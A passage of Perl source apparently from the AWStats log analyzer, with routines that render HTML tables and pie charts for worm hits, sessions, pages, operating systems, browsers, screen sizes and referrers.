        }
        if ( $ShowWormsStats =~ /B/i ) {
            print "<td>" . Format_Bytes( $_worm_k{$key} ) . "</td>";
        }
        if ( $ShowWormsStats =~ /L/i ) {
            print "<td>"
                . (
                $_worm_l{$key}
                    ? Format_Date( $_worm_l{$key}, 1 )
                    : '-'
            )
                . "</td>";
        }
        print "</tr>\n";

        #$total_p += $_worm_p{$key};
        $total_h += $_worm_h{$key};
        $total_k += $_worm_k{$key} || 0;
        $count++;
    }

    # For worms we need to count Totals
    my $TotalPagesWorms =
        0;    #foreach (values %_worm_p) { $TotalPagesWorms+=$_; }
    my $TotalHitsWorms = 0;
    foreach ( values %_worm_h ) { $TotalHitsWorms += $_; }
    my $TotalBytesWorms = 0;
    foreach ( values %_worm_k ) { $TotalBytesWorms += $_; }
    my $rest_p = 0;    #$rest_p=$TotalPagesRobots-$total_p;
    my $rest_h = $TotalHitsWorms - $total_h;
    my $rest_k = $TotalBytesWorms - $total_k;

    if ( $rest_p > 0 || $rest_h > 0 || $rest_k > 0 ) { # All other worms
        print "<tr>";
        print
            "<td class=\"aws\"><span style=\"color: #$color_other\">$Message[2]</span></td>";
        print "<td class=\"aws\">-</td>";
        if ( $ShowWormsStats =~ /H/i ) {
            print "<td>" . Format_Number(($rest_h)) . "</td>";
        }
        if ( $ShowWormsStats =~ /B/i ) {
            print "<td>" . ( Format_Bytes($rest_k) ) . "</td>";
        }
        if ( $ShowWormsStats =~ /L/i ) { print "<td>&nbsp;</td>"; }
        print "</tr>\n";
    }
    &tab_end("* $Message[158]");
}

#------------------------------------------------------------------------------
# Function:     Prints the sessions chart and table
# Parameters:   -
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainSessions{
    if ($Debug) { debug( "ShowSessionsStats", 2 ); }
    print "$Center<a name=\"sessions\">&nbsp;</a><br />\n";
    my $title = "$Message[117]";
    &tab_head( $title, 19, 0, 'sessions' );
    my $Totals = 0;
    my $average_s = 0;
    foreach (@SessionsRange) {
        $average_s += ( $_session{$_} || 0 ) * $SessionsAverage{$_};
        $Totals += $_session{$_} || 0;
    }
    if ($Totals) { $average_s = int( $average_s / $Totals ); }
    else { $average_s = '?'; }
    print "<tr bgcolor=\"#$color_TableBGRowTitle\""
        . Tooltip(1)
        . "><th>$Message[10]: ".Format_Number($TotalVisits)." - $Message[96]: ".Format_Number($average_s)." s</th><th bgcolor=\"#$color_s\" width=\"80\">$Message[10]</th><th bgcolor=\"#$color_s\" width=\"80\">$Message[15]</th></tr>\n";
    $average_s = 0;
    my $total_s   = 0;
    my $count = 0;
    foreach my $key (@SessionsRange) {
        my $p = 0;
        if ($TotalVisits) {
            $p = int( $_session{$key} / $TotalVisits * 1000 ) / 10;
        }
        $total_s += $_session{$key} || 0;
        print "<tr><td class=\"aws\">$key</td>";
        print "<td>"
            . ( $_session{$key} ? Format_Number($_session{$key}) : "&nbsp;" ) . "</td>";
        print "<td>"
            . ( $_session{$key} ? "$p %" : "&nbsp;" ) . "</td>";
        print "</tr>\n";
        $count++;
    }
    my $rest_s = $TotalVisits - $total_s;
    if ( $rest_s > 0 ) {    # All others sessions
        my $p = 0;
        if ($TotalVisits) {
            $p = int( $rest_s / $TotalVisits * 1000 ) / 10;
        }
        print "<tr"
            . Tooltip(20)
            . "><td class=\"aws\"><span style=\"color: #$color_other\">$Message[0]</span></td>";
        print "<td>".Format_Number($rest_s)."</td>";
        print "<td>" . ( $rest_s ? "$p %" : "&nbsp;" ) . "</td>";
        print "</tr>\n";
    }
    &tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the pages chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainPages{
    my $NewLinkParams = shift;
    my $NewLinkTarget = shift;

    if ($Debug) {
        debug(
            "ShowPagesStats (MaxNbOf{'PageShown'}=$MaxNbOf{'PageShown'} TotalDifferentPages=$TotalDifferentPages)",
            2
        );
    }
    my $regext         = qr/\.(\w{1,6})$/;
    print
        "$Center<a name=\"urls\">&nbsp;</a><a name=\"entry\">&nbsp;</a><a name=\"exit\">&nbsp;</a><br />\n";
    my $title =
        "$Message[19] ($Message[77] $MaxNbOf{'PageShown'}) &nbsp; - &nbsp; <a href=\""
            . (
            $ENV{'GATEWAY_INTERFACE'}
                || !$StaticLinks
                ? XMLEncode("$AWScript${NewLinkParams}output=urldetail")
                : "$StaticLinks.urldetail.$StaticExt"
        )
            . "\"$NewLinkTarget>$Message[80]</a>";
    if ( $ShowPagesStats =~ /E/i ) {
        $title .= " &nbsp; - &nbsp; <a href=\""
            . (
            $ENV{'GATEWAY_INTERFACE'}
                || !$StaticLinks
                ? XMLEncode("$AWScript${NewLinkParams}output=urlentry")
                : "$StaticLinks.urlentry.$StaticExt"
        )
            . "\"$NewLinkTarget>$Message[104]</a>";
    }
    if ( $ShowPagesStats =~ /X/i ) {
        $title .= " &nbsp; - &nbsp; <a href=\""
            . (
            $ENV{'GATEWAY_INTERFACE'}
                || !$StaticLinks
                ? XMLEncode("$AWScript${NewLinkParams}output=urlexit")
                : "$StaticLinks.urlexit.$StaticExt"
        )
            . "\"$NewLinkTarget>$Message[116]</a>";
    }

    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
        # extend the title to include the added link
        $title .= " &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
            "$AddLinkToExternalCGIWrapper" . "?section=SIDER&baseName=$DirData/$PROG"
                . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
                . "&siteConfig=$SiteConfig" )
            . "\"$NewLinkTarget>$Message[179]</a>");
    }

    &tab_head( "$title", 19, 0, 'urls' );
    print
        "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>".Format_Number($TotalDifferentPages)." $Message[28]</th>";
    if ( $ShowPagesStats =~ /P/i && $LogType ne 'F' ) {
        print
            "<th bgcolor=\"#$color_p\" width=\"80\">$Message[29]</th>";
    }
    if ( $ShowPagesStats =~ /[PH]/i && $LogType eq 'F' ) {
        print
            "<th bgcolor=\"#$color_h\" width=\"80\">$Message[57]</th>";
    }
    if ( $ShowPagesStats =~ /B/i ) {
        print
            "<th bgcolor=\"#$color_k\" width=\"80\">$Message[106]</th>";
    }
    if ( $ShowPagesStats =~ /E/i ) {
        print
            "<th bgcolor=\"#$color_e\" width=\"80\">$Message[104]</th>";
    }
    if ( $ShowPagesStats =~ /X/i ) {
        print
            "<th bgcolor=\"#$color_x\" width=\"80\">$Message[116]</th>";
    }

    # Call to plugins' function ShowPagesAddField
    foreach
    my $pluginname ( keys %{ $PluginsLoaded{'ShowPagesAddField'} } )
    {

        #				my $function="ShowPagesAddField_$pluginname('title')";
        #				eval("$function");
        my $function = "ShowPagesAddField_$pluginname";
        &$function('title');
    }
    print "<th>&nbsp;</th></tr>\n";
    my $total_p = my $total_e = my $total_x = my $total_k = 0;
    my $max_p   = 1;
    my $max_k   = 1;
    my $count = 0;
    &BuildKeyList( $MaxNbOf{'PageShown'}, $MinHit{'File'}, \%_url_p,
        \%_url_p );
    foreach my $key (@keylist) {
        if ( $_url_p{$key} > $max_p ) { $max_p = $_url_p{$key}; }
        if ( $_url_k{$key} / ( $_url_p{$key} || 1 ) > $max_k ) {
            $max_k = $_url_k{$key} / ( $_url_p{$key} || 1 );
        }
    }
    foreach my $key (@keylist) {
        print "<tr><td class=\"aws\">";
        &HTMLShowURLInfo($key);
        print "</td>";
        my $bredde_p = 0;
        my $bredde_e = 0;
        my $bredde_x = 0;
        my $bredde_k = 0;
        if ( $max_p > 0 ) {
            $bredde_p =
                int( $BarWidth * ( $_url_p{$key} || 0 ) / $max_p ) + 1;
        }
        if ( ( $bredde_p == 1 ) && $_url_p{$key} ) { $bredde_p = 2; }
        if ( $max_p > 0 ) {
            $bredde_e =
                int( $BarWidth * ( $_url_e{$key} || 0 ) / $max_p ) + 1;
        }
        if ( ( $bredde_e == 1 ) && $_url_e{$key} ) { $bredde_e = 2; }
        if ( $max_p > 0 ) {
            $bredde_x =
                int( $BarWidth * ( $_url_x{$key} || 0 ) / $max_p ) + 1;
        }
        if ( ( $bredde_x == 1 ) && $_url_x{$key} ) { $bredde_x = 2; }
        if ( $max_k > 0 ) {
            $bredde_k =
                int( $BarWidth *
                    ( ( $_url_k{$key} || 0 ) / ( $_url_p{$key} || 1 ) ) /
                    $max_k ) + 1;
        }
        if ( ( $bredde_k == 1 ) && $_url_k{$key} ) { $bredde_k = 2; }
        if ( $ShowPagesStats =~ /P/i && $LogType ne 'F' ) {
            print "<td>".Format_Number($_url_p{$key})."</td>";
        }
        if ( $ShowPagesStats =~ /[PH]/i && $LogType eq 'F' ) {
            print "<td>".Format_Number($_url_p{$key})."</td>";
        }
        if ( $ShowPagesStats =~ /B/i ) {
            print "<td>"
                . (
                $_url_k{$key}
                    ? Format_Bytes(
                    $_url_k{$key} / ( $_url_p{$key} || 1 )
                )
                    : "&nbsp;"
            )
                . "</td>";
        }
        if ( $ShowPagesStats =~ /E/i ) {
            print "<td>"
                . ( $_url_e{$key} ? Format_Number($_url_e{$key}) : "&nbsp;" ) . "</td>";
        }
        if ( $ShowPagesStats =~ /X/i ) {
            print "<td>"
                . ( $_url_x{$key} ? Format_Number($_url_x{$key}) : "&nbsp;" ) . "</td>";
        }

        # Call to plugins' function ShowPagesAddField
        foreach my $pluginname (
            keys %{ $PluginsLoaded{'ShowPagesAddField'} } )
        {

            #					my $function="ShowPagesAddField_$pluginname('$key')";
            #					eval("$function");
            my $function = "ShowPagesAddField_$pluginname";
            &$function($key);
        }
        print "<td class=\"aws\">";
        if ( $ShowPagesStats =~ /P/i && $LogType ne 'F' ) {
            print
                "<img src=\"$DirIcons\/other\/$BarPng{'hp'}\" width=\"$bredde_p\" height=\"4\""
                    . AltTitle("")
                    . " /><br />";
        }
        if ( $ShowPagesStats =~ /[PH]/i && $LogType eq 'F' ) {
            print
                "<img src=\"$DirIcons\/other\/$BarPng{'hh'}\" width=\"$bredde_p\" height=\"4\""
                    . AltTitle("")
                    . " /><br />";
        }
        if ( $ShowPagesStats =~ /B/i ) {
            print
                "<img src=\"$DirIcons\/other\/$BarPng{'hk'}\" width=\"$bredde_k\" height=\"4\""
                    . AltTitle("")
                    . " /><br />";
        }
        if ( $ShowPagesStats =~ /E/i ) {
            print
                "<img src=\"$DirIcons\/other\/$BarPng{'he'}\" width=\"$bredde_e\" height=\"4\""
                    . AltTitle("")
                    . " /><br />";
        }
        if ( $ShowPagesStats =~ /X/i ) {
            print
                "<img src=\"$DirIcons\/other\/$BarPng{'hx'}\" width=\"$bredde_x\" height=\"4\""
                    . AltTitle("") . " />";
        }
        print "</td></tr>\n";
        $total_p += $_url_p{$key} || 0;
        $total_e += $_url_e{$key} || 0;
        $total_x += $_url_x{$key} || 0;
        $total_k += $_url_k{$key} || 0;
        $count++;
    }
    my $rest_p = $TotalPages - $total_p;
    my $rest_e = $TotalEntries - $total_e;
    my $rest_x = $TotalExits - $total_x;
    my $rest_k = $TotalBytesPages - $total_k;
    if ( $rest_p > 0 || $rest_k > 0 || $rest_e > 0 || $rest_x > 0 )
    {    # All other urls
        print
            "<tr><td class=\"aws\"><span style=\"color: #$color_other\">$Message[2]</span></td>";
        if ( $ShowPagesStats =~ /P/i && $LogType ne 'F' ) {
            print "<td>".Format_Number($rest_p)."</td>";
        }
        if ( $ShowPagesStats =~ /[PH]/i && $LogType eq 'F' ) {
            print "<td>".Format_Number($rest_p)."</td>";
        }
        if ( $ShowPagesStats =~ /B/i ) {
            print "<td>"
                . (
                $rest_k
                    ? Format_Bytes( $rest_k / ( $rest_p || 1 ) )
                    : "&nbsp;"
            )
                . "</td>";
        }
        if ( $ShowPagesStats =~ /E/i ) {
            print "<td>" . ( $rest_e ? Format_Number($rest_e) : "&nbsp;" ) . "</td>";
        }
        if ( $ShowPagesStats =~ /X/i ) {
            print "<td>" . ( $rest_x ? Format_Number($rest_x) : "&nbsp;" ) . "</td>";
        }

        # Call to plugins' function ShowPagesAddField
        foreach my $pluginname (
            keys %{ $PluginsLoaded{'ShowPagesAddField'} } )
        {

            #					my $function="ShowPagesAddField_$pluginname('')";
            #					eval("$function");
            my $function = "ShowPagesAddField_$pluginname";
            &$function('');
        }
        print "<td>&nbsp;</td></tr>\n";
    }
    &tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the OS chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainOS{
    my $NewLinkParams = shift;
    my $NewLinkTarget = shift;

    if ($Debug) { debug( "ShowOSStats", 2 ); }
    print "$Center<a name=\"os\">&nbsp;</a><br />\n";
    my $Totalh   = 0;
    my $Totalp   = 0;
    my %new_os_h = ();
    my %new_os_p = ();
    OSLOOP: foreach my $key ( keys %_os_h ) {
        $Totalh += $_os_h{$key};
        $Totalp += $_os_p{$key};
        foreach my $family ( keys %OSFamily ) {
            if ( $key =~ /^$family/i ) {
                $new_os_h{"${family}cumul"} += $_os_h{$key};
                $new_os_p{"${family}cumul"} += $_os_p{$key};
                next OSLOOP;
            }
        }
        $new_os_h{$key} += $_os_h{$key};
        $new_os_p{$key} += $_os_p{$key};
    }
    my $title =
        "$Message[59] ($Message[77] $MaxNbOf{'OsShown'}) &nbsp; - &nbsp; <a href=\""
            . (
            $ENV{'GATEWAY_INTERFACE'}
                || !$StaticLinks
                ? XMLEncode("$AWScript${NewLinkParams}output=osdetail")
                : "$StaticLinks.osdetail.$StaticExt"
        )
            . "\"$NewLinkTarget>$Message[80]/$Message[58]</a> &nbsp; - &nbsp; <a href=\""
            . (
            $ENV{'GATEWAY_INTERFACE'}
                || !$StaticLinks
                ? XMLEncode("$AWScript${NewLinkParams}output=unknownos")
                : "$StaticLinks.unknownos.$StaticExt"
        )
            . "\"$NewLinkTarget>$Message[0]</a>";

    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
        # extend the title to include the added link
        $title .= " &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
            "$AddLinkToExternalCGIWrapper" . "?section=OS&baseName=$DirData/$PROG"
                . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
                . "&siteConfig=$SiteConfig" )
            . "\"$NewLinkTarget>$Message[179]</a>");
    }

    &tab_head( "$title", 19, 0, 'os' );

    &BuildKeyList( $MaxNbOf{'OsShown'}, $MinHit{'Os'}, \%new_os_h,
        \%new_os_p );

    # Graph the top five in a pie chart
    if (scalar @keylist > 1){
        foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
        {
            my @blocklabel = ();
            my @valdata = ();
            my @valcolor = ($color_p);
            my $cnt = 0;
            foreach my $key (@keylist) {
                push @valdata, int(  $new_os_h{$key} / $Totalh * 1000 ) / 10;
                if ($key eq 'Unknown'){push @blocklabel, "$key"; }
                else{
                    my $keywithoutcumul = $key;
                    $keywithoutcumul =~ s/cumul$//i;
                    my $libos = $OSHashLib{$keywithoutcumul}
                        || $keywithoutcumul;
                    my $nameicon = $keywithoutcumul;
                    $nameicon =~ s/[^\w]//g;
                    if ( $OSFamily{$keywithoutcumul} ) {
                        $libos = $OSFamily{$keywithoutcumul};
                    }
                    push @blocklabel, "$libos";
                }
                $cnt++;
                if ($cnt > 4) { last; }
            }
            print "<tr><td colspan=\"5\">";
            my $function = "ShowGraph_$pluginname";
            &$function(
                "Top 5 Operating Systems",       "oss",
                0, 						\@blocklabel,
                0,           			\@valcolor,
                0,              		0,
                0,          			\@valdata
            );
            print "</td></tr>";
        }
    }

    print
        "<tr bgcolor=\"#$color_TableBGRowTitle\"><th width=\"$WIDTHCOLICON\">&nbsp;</th><th>$Message[59]</th>";
    print
        "<th bgcolor=\"#$color_p\" width=\"80\">$Message[56]</th><th bgcolor=\"#$color_p\" width=\"80\">$Message[15]</th>";
    print
        "<th bgcolor=\"#$color_h\" width=\"80\">$Message[57]</th><th bgcolor=\"#$color_h\" width=\"80\">$Message[15]</th></tr>\n";
    my $total_h = 0;
    my $total_p = 0;
    my $count = 0;

    foreach my $key (@keylist) {
        my $p_h = '&nbsp;';
        my $p_p = '&nbsp;';
        if ($Totalh) {
            $p_h = int( $new_os_h{$key} / $Totalh * 1000 ) / 10;
            $p_h = "$p_h %";
        }
        if ($Totalp) {
            $p_p = int( $new_os_p{$key} / $Totalp * 1000 ) / 10;
            $p_p = "$p_p %";
        }
        if ( $key eq 'Unknown' ) {
            print "<tr><td"
                . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
                . "><img src=\"$DirIcons\/os\/unknown.png\""
                . AltTitle("")
                . " /></td><td class=\"aws\"><span style=\"color: #$color_other\">$Message[0]</span></td>"
                . "<td>".Format_Number($_os_p{$key})."</td><td>$p_p</td><td>".Format_Number($_os_h{$key})."</td><td>$p_h</td></tr>\n";
        }
        else {
            my $keywithoutcumul = $key;
            $keywithoutcumul =~ s/cumul$//i;
            my $libos = $OSHashLib{$keywithoutcumul}
                || $keywithoutcumul;
            my $nameicon = $keywithoutcumul;
            $nameicon =~ s/[^\w]//g;
            if ( $OSFamily{$keywithoutcumul} ) {
                $libos = "<b>" . $OSFamily{$keywithoutcumul} . "</b>";
            }
            print "<tr><td"
                . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
                . "><img src=\"$DirIcons\/os\/$nameicon.png\""
                . AltTitle("")
                . " /></td><td class=\"aws\">$libos</td><td>".Format_Number($new_os_p{$key})."</td><td>$p_p</td><td>".Format_Number($new_os_h{$key})."</td><td>$p_h</td></tr>\n";
        }
        $total_h += $new_os_h{$key};
        $total_p += $new_os_p{$key};
        $count++;
    }
    if ($Debug) {
        debug( "Total real / shown : $Totalh / $total_h", 2 );
    }
    my $rest_h = $Totalh - $total_h;
    my $rest_p = $Totalp - $total_p;
    if ( $rest_h > 0 ) {
        my $p_p;
        my $p_h;
        if ($Totalh) { $p_h = int( $rest_h / $Totalh * 1000 ) / 10; }
        if ($Totalp) { $p_p = int( $rest_p / $Totalp * 1000 ) / 10; }
        print "<tr>";
        print "<td>&nbsp;</td>";
        print
            "<td class=\"aws\"><span style=\"color: #$color_other\">$Message[2]</span></td><td>".Format_Number($rest_p)."</td>";
        print "<td>$p_p %</td><td>".Format_Number($rest_h)."</td><td>$p_h %</td></tr>\n";
    }
    &tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the Browsers chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainBrowsers{
    my $NewLinkParams = shift;
    my $NewLinkTarget = shift;

    if ($Debug) { debug( "ShowBrowsersStats", 2 ); }
    print "$Center<a name=\"browsers\">&nbsp;</a><br />\n";
    my $Totalh        = 0;
    my $Totalp        = 0;
    my %new_browser_h = ();
    my %new_browser_p = ();
    BROWSERLOOP: foreach my $key ( keys %_browser_h ) {
        $Totalh += $_browser_h{$key};
        $Totalp += $_browser_p{$key};
        foreach my $family ( keys %BrowsersFamily ) {
            if ( $key =~ /^$family/i ) {
                $new_browser_h{"${family}cumul"} += $_browser_h{$key};
                $new_browser_p{"${family}cumul"} += $_browser_p{$key};
                next BROWSERLOOP;
            }
        }
        $new_browser_h{$key} += $_browser_h{$key};
        $new_browser_p{$key} += $_browser_p{$key};
    }
    my $title =
        "$Message[21] ($Message[77] $MaxNbOf{'BrowsersShown'}) &nbsp; - &nbsp; <a href=\""
            . (
            $ENV{'GATEWAY_INTERFACE'}
                || !$StaticLinks
                ? XMLEncode("$AWScript${NewLinkParams}output=browserdetail")
                : "$StaticLinks.browserdetail.$StaticExt"
        )
            . "\"$NewLinkTarget>$Message[80]/$Message[58]</a> &nbsp; - &nbsp; <a href=\""
            . (
            $ENV{'GATEWAY_INTERFACE'}
                || !$StaticLinks
                ? XMLEncode("$AWScript${NewLinkParams}output=unknownbrowser")
                : "$StaticLinks.unknownbrowser.$StaticExt"
        )
            . "\"$NewLinkTarget>$Message[0]</a>";


    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
        # extend the title to include the added link
        $title .= " &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
            "$AddLinkToExternalCGIWrapper" . "?section=BROWSER&baseName=$DirData/$PROG"
                . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
                . "&siteConfig=$SiteConfig" )
            . "\"$NewLinkTarget>$Message[179]</a>");
    }

    &tab_head( "$title", 19, 0, 'browsers' );

    &BuildKeyList(
        $MaxNbOf{'BrowsersShown'}, $MinHit{'Browser'},
        \%new_browser_h,           \%new_browser_p
    );

    # Graph the top five in a pie chart
    if (scalar @keylist > 1){
        foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
        {
            my @blocklabel = ();
            my @valdata = ();
            my @valcolor = ($color_p);
            my $cnt = 0;
            foreach my $key (@keylist) {
                push @valdata, int(  $new_browser_h{$key} / $TotalHits * 1000 ) / 10;
                if ($key eq 'Unknown'){push @blocklabel, "$key"; }
                else{
                    my $keywithoutcumul = $key;
                    $keywithoutcumul =~ s/cumul$//i;
                    my $libbrowser = $BrowsersHashIDLib{$keywithoutcumul}
                        || $keywithoutcumul;
                    my $nameicon = $BrowsersHashIcon{$keywithoutcumul}
                        || "notavailable";
                    if ( $BrowsersFamily{$keywithoutcumul} ) {
                        $libbrowser = "$libbrowser";
                    }
                    push @blocklabel, "$libbrowser";
                }
                $cnt++;
                if ($cnt > 4) { last; }
            }
            print "<tr><td colspan=\"5\">";
            my $function = "ShowGraph_$pluginname";
            &$function(
                "Top 5 Browsers",       "browsers",
                0, 						\@blocklabel,
                0,           			\@valcolor,
                0,              		0,
                0,          			\@valdata
            );
            print "</td></tr>";
        }
    }
    print
        "<tr bgcolor=\"#$color_TableBGRowTitle\"><th width=\"$WIDTHCOLICON\">&nbsp;</th><th>$Message[21]</th><th width=\"80\">$Message[111]</th><th bgcolor=\"#$color_p\" width=\"80\">$Message[56]</th><th bgcolor=\"#$color_p\" width=\"80\">$Message[15]</th><th bgcolor=\"#$color_h\" width=\"80\">$Message[57]</th><th bgcolor=\"#$color_h\" width=\"80\">$Message[15]</th></tr>\n";
    my $total_h = 0;
    my $total_p = 0;
    my $count = 0;
    foreach my $key (@keylist) {
        my $p_h = '&nbsp;';
        my $p_p = '&nbsp;';
        if ($Totalh) {
            $p_h = int( $new_browser_h{$key} / $Totalh * 1000 ) / 10;
            $p_h = "$p_h %";
        }
        if ($Totalp) {
            $p_p = int( $new_browser_p{$key} / $Totalp * 1000 ) / 10;
            $p_p = "$p_p %";
        }
        if ( $key eq 'Unknown' ) {
            print "<tr><td"
                . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
                . "><img src=\"$DirIcons\/browser\/unknown.png\""
                . AltTitle("")
                . " /></td><td class=\"aws\"><span style=\"color: #$color_other\">$Message[0]</span></td><td width=\"80\">?</td>"
                . "<td>".Format_Number($_browser_p{$key})."</td><td>$p_p</td>"
                . "<td>".Format_Number($_browser_h{$key})."</td><td>$p_h</td></tr>\n";
        }
        else {
            my $keywithoutcumul = $key;
            $keywithoutcumul =~ s/cumul$//i;
            my $libbrowser = $BrowsersHashIDLib{$keywithoutcumul}
                || $keywithoutcumul;
            my $nameicon = $BrowsersHashIcon{$keywithoutcumul}
                || "notavailable";
            if ( $BrowsersFamily{$keywithoutcumul} ) {
                $libbrowser = "<b>$libbrowser</b>";
            }
            print "<tr><td"
                . ( $count ? "" : " width=\"$WIDTHCOLICON\"" )
                . "><img src=\"$DirIcons\/browser\/$nameicon.png\""
                . AltTitle("")
                . " /></td><td class=\"aws\">"
                . ( $PageDir eq 'rtl' ? "<span dir=\"ltr\">" : "" )
                . "$libbrowser"
                . ( $PageDir eq 'rtl' ? "</span>" : "" )
                . "</td><td>"
                . (
                $BrowsersHereAreGrabbers{$key}
                    ? "<b>$Message[112]</b>"
                    : "$Message[113]"
            )
                . "</td><td>".Format_Number($new_browser_p{$key})."</td><td>$p_p</td><td>".Format_Number($new_browser_h{$key})."</td><td>$p_h</td></tr>\n";
        }
        $total_h += $new_browser_h{$key};
        $total_p += $new_browser_p{$key};
        $count++;
    }
    if ($Debug) {
        debug( "Total real / shown : $Totalh / $total_h", 2 );
    }
    my $rest_h = $Totalh - $total_h;
    my $rest_p = $Totalp - $total_p;
    if ( $rest_h > 0 ) {
        my $p_p = 0.0;
        my $p_h;
        if ($Totalh) { $p_h = int( $rest_h / $Totalh * 1000 ) / 10; }
        if ($Totalp) { $p_p = int( $rest_p / $Totalp * 1000 ) / 10; }
        print "<tr>";
        print "<td>&nbsp;</td>";
        print
            "<td class=\"aws\"><span style=\"color: #$color_other\">$Message[2]</span></td><td>&nbsp;</td><td>$rest_p</td>";
        print "<td>$p_p %</td><td>$rest_h</td><td>$p_h %</td></tr>\n";
    }
    &tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the ScreenSize chart and table
# Parameters:   -
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainScreenSize{
    if ($Debug) { debug( "ShowScreenSizeStats", 2 ); }
    print "$Center<a name=\"screensizes\">&nbsp;</a><br />\n";
    my $Totalh = 0;
    foreach ( keys %_screensize_h ) { $Totalh += $_screensize_h{$_}; }
    my $title =
        "$Message[135] ($Message[77] $MaxNbOf{'ScreenSizesShown'})";
    &tab_head( "$title", 0, 0, 'screensizes' );
    print
        "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>$Message[135]</th><th bgcolor=\"#$color_h\" width=\"80\">$Message[15]</th></tr>\n";
    my $total_h = 0;
    my $count   = 0;
    &BuildKeyList( $MaxNbOf{'ScreenSizesShown'},
        $MinHit{'ScreenSize'}, \%_screensize_h, \%_screensize_h );

    foreach my $key (@keylist) {
        my $p = '&nbsp;';
        if ($Totalh) {
            $p = int( $_screensize_h{$key} / $Totalh * 1000 ) / 10;
            $p = "$p %";
        }
        $total_h += $_screensize_h{$key} || 0;
        print "<tr>";
        if ( $key eq 'Unknown' ) {
            print
                "<td class=\"aws\"><span style=\"color: #$color_other\">$Message[0]</span></td>";
            print "<td>$p</td>";
        }
        else {
            my $screensize = $key;
            print "<td class=\"aws\">$screensize</td>";
            print "<td>$p</td>";
        }
        print "</tr>\n";
        $count++;
    }
    my $rest_h = $Totalh - $total_h;
    if ( $rest_h > 0 ) {    # All others sessions
        my $p = 0;
        if ($Totalh) { $p = int( $rest_h / $Totalh * 1000 ) / 10; }
        print
            "<tr><td class=\"aws\"><span style=\"color: #$color_other\">$Message[2]</span></td>";
        print "<td>" . ( $rest_h ? "$p %" : "&nbsp;" ) . "</td>";
        print "</tr>\n";
    }
    &tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the Referrers chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainReferrers{
    my $NewLinkParams = shift;
    my $NewLinkTarget = shift;

    if ($Debug) { debug( "ShowOriginStats", 2 ); }
    print "$Center<a name=\"referer\">&nbsp;</a><br />\n";
    my $Totalp = 0;
    foreach ( 0 .. 5 ) {
        $Totalp +=
            ( $_ != 4 || $IncludeInternalLinksInOriginSection )
                ? $_from_p[$_]
                : 0;
    }
    my $Totalh = 0;
    foreach ( 0 .. 5 ) {
        $Totalh +=
            ( $_ != 4 || $IncludeInternalLinksInOriginSection )
                ? $_from_h[$_]
                : 0;
    }

    my $title = "$Message[36]";

    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
        # extend the title to include the added link
        $title .= " &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
            "$AddLinkToExternalCGIWrapper" . "?section=ORIGIN&baseName=$DirData/$PROG"
                . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
                . "&siteConfig=$SiteConfig" )
            . "\"$NewLinkTarget>$Message[179]</a>");
    }

    &tab_head( $title, 19, 0, 'referer' );
    my @p_p = ( 0, 0, 0, 0, 0, 0 );
    if ( $Totalp > 0 ) {
        $p_p[0] = int( $_from_p[0] / $Totalp * 1000 ) / 10;
        $p_p[1] = int( $_from_p[1] / $Totalp * 1000 ) / 10;
        $p_p[2] = int( $_from_p[2] / $Totalp * 1000 ) / 10;
        $p_p[3] = int( $_from_p[3] / $Totalp * 1000 ) / 10;
        $p_p[4] = int( $_from_p[4] / $Totalp * 1000 ) / 10;
        $p_p[5] = int( $_from_p[5] / $Totalp * 1000 ) / 10;
    }
    my @p_h = ( 0, 0, 0, 0, 0, 0 );
    if ( $Totalh > 0 ) {
        $p_h[0] = int( $_from_h[0] / $Totalh * 1000 ) / 10;
        $p_h[1] = int( $_from_h[1] / $Totalh * 1000 ) / 10;
        $p_h[2] = int( $_from_h[2] / $Totalh * 1000 ) / 10;
        $p_h[3] = int( $_from_h[3] / $Totalh * 1000 ) / 10;
        $p_h[4] = int( $_from_h[4] / $Totalh * 1000 ) / 10;
        $p_h[5] = int( $_from_h[5] / $Totalh * 1000 ) / 10;
    }
    print
        "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>$Message[37]</th>";
    if ( $ShowOriginStats =~ /P/i ) {
        print
            "<th bgcolor=\"#$color_p\" width=\"80\">$Message[56]</th><th bgcolor=\"#$color_p\" width=\"80\">$Message[15]</th>";
    }
    if ( $ShowOriginStats =~ /H/i ) {
        print
            "<th bgcolor=\"#$color_h\" width=\"80\">$Message[57]</th><th bgcolor=\"#$color_h\" width=\"80\">$Message[15]</th>";
    }
    print "</tr>\n";

